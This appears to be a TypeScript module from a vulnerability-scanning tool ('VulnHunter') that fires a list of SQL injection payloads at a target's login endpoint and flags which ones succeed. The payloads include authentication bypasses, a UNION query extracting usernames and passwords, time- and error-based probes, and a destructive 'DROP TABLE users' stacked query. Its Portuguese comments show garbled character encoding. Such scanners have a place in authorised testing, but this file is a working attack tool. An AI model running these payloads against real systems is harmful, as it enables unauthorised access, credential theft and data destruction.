import { BaseExploit, ExploitResult } from './base';

export class SQLInjectionExploit extends BaseExploit {
  getPayloads() {
    return [
      {
        name: 'sqli_auth_bypass_1',
        payload: "' OR '1'='1",
        description: 'Bypass de autentica√ß√£o cl√°ssico',
        type: 'auth_bypass',
      },
      {
        name: 'sqli_auth_bypass_2',
        payload: "admin' --",
        description: 'Bypass com coment√°rio',
        type: 'auth_bypass',
      },
      {
        name: 'sqli_auth_bypass_3',
        payload: "' OR 1=1 --",
        description: 'OR 1=1 comment',
        type: 'auth_bypass',
      },
      {
        name: 'sqli_union_1',
        payload: "' UNION SELECT NULL--",
        description: 'UNION SELECT b√°sico',
        type: 'union',
      },
      {
        name: 'sqli_union_2',
        payload: "' UNION SELECT username, password FROM users--",
        description: 'UNION para extrair credenciais',
        type: 'union',
      },
      {
        name: 'sqli_time_based',
        payload: "' OR SLEEP(5)--",
        description: 'Time-based blind SQL injection',
        type: 'time_based',
      },
      {
        name: 'sqli_error_based',
        payload: "' AND 1=CONVERT(int, @@version)--",
        description: 'Error-based information disclosure',
        type: 'error_based',
      },
      {
        name: 'sqli_stacked_queries',
        payload: "'; DROP TABLE users--",
        description: 'Stacked queries (PERIGOSO!)',
        type: 'stacked',
      },
    ];
  }

  async testPayload(payloadConfig: any) {
    const endpoint = this.vulnerability.endpoint || '/api/login';
    const parameter = this.vulnerability.parameter || 'username';
    const url = `${this.targetUrl}${endpoint}`;

    try {
      const body: any = {};
      body[parameter] = payloadConfig.payload;
      body['password'] = 'anypassword';

      const startTime = Date.now();
      
      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': 'VulnHunter/1.0',
        },
        body: JSON.stringify(body),
      });

      const endTime = Date.now();
      const responseTime = endTime - startTime;

      const responseText = await response.text();
      let responseData;
      try {
        responseData = JSON.parse(responseText);
      } catch {
        responseData = responseText;
      }

      // Detecta sinais de vulnerabilidade
      const isVulnerable = 
        response.ok || // Autenticou com sucesso
        responseTime > 4000 || // Time-based
        responseText.toLowerCase().includes('sql') || // Error-based
        responseText.toLowerCase().includes('syntax') ||
        responseText.toLowerCase().includes('mysql') ||
        responseText.toLowerCase().includes('postgresql');

      return {
        name: payloadConfig.name,
        payload: payloadConfig.payload,
        type: payloadConfig.type,
        vulnerable: isVulnerable,
        statusCode: response.status,
        responseTime,
        response: responseData,
        responsePreview: responseText.substring(0, 300),
        indicators: {
          authBypassed: response.ok,
          timeBased: responseTime > 4000,
          errorBased: responseText.toLowerCase().includes('sql'),
          suspiciousResponse: responseText.length > 500,
        },
        curlCommand: this.generateCurlCommand('POST', url, {
          headers: { 'Content-Type': 'application/json' },
          body,
        }),
      };

    } catch (error) {
      return null;
    }
  }

  async execute(): Promise<ExploitResult> {
    this.log(`üíâ Iniciando teste de SQL Injection em ${this.targetUrl}`);
    
    let vulnerablePayloads = 0;

    for (const payloadConfig of this.getPayloads()) {
      this.log(`üß™ Testando: ${payloadConfig.name}`);
      
      const result = await this.testPayload(payloadConfig);
      
      if (result) {
        if (result.vulnerable) {
          vulnerablePayloads++;
          this.log(`üî• VULNER√ÅVEL! ${payloadConfig.name}`, 'success');
          
          this.addEvidence('sqli_vulnerable', {
            payload: result.payload,
            type: result.type,
            indicators: result.indicators,
            curlCommand: result.curlCommand,
          });
        } else {
          this.log(`‚úì Protegido contra ${payloadConfig.name}`, 'info');
        }
        
        this.results.exploits.push(result);
      }

      await new Promise(resolve => setTimeout(resolve, 1000));
    }

    this.results.success = vulnerablePayloads > 0;
    this.results.summary = {
      totalAttempts: this.getPayloads().length,
      successful: vulnerablePayloads,
      failed: this.getPayloads().length - vulnerablePayloads,
    };

    if (vulnerablePayloads > 0) {
      this.log(`‚ö†Ô∏è SISTEMA VULNER√ÅVEL A SQL INJECTION!`, 'warning');
      this.log(`üìä ${vulnerablePayloads} payloads funcionaram`);
    } else {
      this.log(`‚úÖ Sistema protegido contra SQL Injection`, 'success');
    }

    return this.finalize();
  }
}
